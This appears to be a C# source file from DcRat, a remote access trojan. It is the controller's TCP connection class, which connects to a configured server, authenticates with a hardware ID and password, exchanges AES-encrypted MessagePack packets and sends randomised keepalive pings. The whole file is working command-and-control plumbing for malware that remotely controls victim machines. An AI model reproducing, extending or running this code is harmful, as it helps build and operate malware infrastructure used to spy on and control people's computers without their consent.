using System;
using System.Collections.Generic;
using System.IO;
using System.Net.Sockets;
using System.Threading;
using DcRat.ChildForms;
using DcRat.HandlePacket;
using DcRat.Properties;
using MessagePack;

namespace DcRat.TCPSocket
{
    public class Connection
    {
        public static Socket Client { get; set; } //Main socket
        private static byte[] Buffer { get; set; } //Socket buffer
        private static long Buffersize { get; set; }
        private static long Offset { get; set; } // Buffer location
        private static Timer KeepAlive { get; set; } //Send Performance
        public static bool IsConnected { get; set; } //Check socket status
        private static object SendSync { get; } = new object(); //Sync send
        public static int Interval { get; set; } //ping value
        private static MemoryStream MS { get; set; }


        public static List<MsgPack> Packs = new List<MsgPack>();

        public static void InitializeClient() //Connect & reconnect
        {
            try
            {
                Client = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp)
                {
                    ReceiveBufferSize = 50 * 1024,
                    SendBufferSize = 50 * 1024
                };

                Client.Connect(Settings.Default.IP, Convert.ToInt32(Settings.Default.Port));

                if (Client.Connected)
                {
                    IsConnected = true;
                    Buffer = new byte[4];
                    MS = new MemoryStream();
                    Send(SendInfo());
                    Interval = 0;
                    KeepAlive = new Timer(KeepAlivePacket, null,
                        new Random().Next(10 * 1000, 15 * 1000), new Random().Next(10 * 1000, 15 * 1000));
                    Client.BeginReceive(Buffer, 0, Buffer.Length, SocketFlags.None, ReadServertData, null);
                    FormMain.childForm_Home.AppandLog("Connected to Server!");
                }
                else
                {
                    IsConnected = false;
                }
            }
            catch(Exception ex)
            {
                IsConnected = false;
            }
        }

        public static void Reconnect()
        {
            try
            {
                KeepAlive?.Dispose();
                if (Client != null)
                {
                    Client.Close();
                    Client.Dispose();
                }

                MS?.Dispose();
            }
            finally
            {
                InitializeClient();
            }
        }

        public static void ReadServertData(IAsyncResult ar)
        {
            try
            {
                if (!Client.Connected || !IsConnected)
                {
                    IsConnected = false;
                    return;
                }

                var recevied = Client.EndReceive(ar);
                if (recevied > 0)
                {
                    MS.Write(Buffer, 0, recevied);
                    Buffersize = BitConverter.ToInt32(MS.ToArray(), 0);
                    MS.Dispose();
                    MS = new MemoryStream();
                    if (Buffersize > 0)
                    {
                        Buffer = new byte[Buffersize];
                        while (MS.Length != Buffersize)
                        {
                            var rc = Client.Receive(Buffer, 0, Buffer.Length, SocketFlags.None);
                            if (rc == 0)
                            {
                                IsConnected = false;
                                return;
                            }

                            MS.Write(Buffer, 0, rc);
                            Buffer = new byte[Buffersize - MS.Length];
                        }

                        if (MS.Length == Buffersize)
                        {
                            ThreadPool.QueueUserWorkItem(Packet.Read, MS.ToArray());
                            Buffer = new byte[4];
                            MS.Dispose();
                            MS = new MemoryStream();
                        }
                        else
                        {
                            Buffer = new byte[Buffersize - MS.Length];
                        }
                    }

                    Client.BeginReceive(Buffer, 0, Buffer.Length, SocketFlags.None, ReadServertData, null);
                }
                else
                {
                    IsConnected = false;
                }
            }
            catch
            {
                IsConnected = false;
            }
        }

        public static void Send(object msg)
        {
            lock (SendSync)
            {
                try
                {
                    if (!Client.Connected || !IsConnected)
                    {
                        IsConnected = false;
                        return;
                    }

                    if (msg == null) return;

                    var buffer = Helper.Helper.Aes.Encrypt((byte[]) msg);
                    var buffersize = BitConverter.GetBytes(buffer.Length);

                    Client.Poll(-1, SelectMode.SelectWrite);
                    Client.Send(buffersize, 0, buffersize.Length, SocketFlags.None);
                    Client.Send(buffer, 0, buffer.Length, SocketFlags.None);
                }
                catch
                {
                    IsConnected = false;
                }
            }
        }

        public static void KeepAlivePacket(object obj)
        {
            try
            {
                var pack = new MsgPack();
                pack.ForcePathObject("Packet").AsString = "Ping";
                var msgpack = new MsgPack();
                msgpack.ForcePathObject("Type").AsString = "Controler";
                msgpack.ForcePathObject("HWID").AsString = Setting.HWID;
                msgpack.ForcePathObject("Password").AsString = Settings.Default.connectpassword;
                msgpack.ForcePathObject("Msgpack").SetAsBytes(pack.Encode2Bytes());
                Send(msgpack.Encode2Bytes());
                GC.Collect();
            }
            catch
            {
            }
        }

        public static byte[] SendInfo()
        {
            var pack = new MsgPack();
            pack.ForcePathObject("Packet").AsString = "Connect";
            var msgpack = new MsgPack();
            msgpack.ForcePathObject("Type").AsString = "Controler";
            msgpack.ForcePathObject("HWID").AsString = Setting.HWID;
            msgpack.ForcePathObject("Password").AsString = Settings.Default.connectpassword;
            msgpack.ForcePathObject("Msgpack").SetAsBytes(pack.Encode2Bytes());
            return msgpack.Encode2Bytes();
        }
    }
}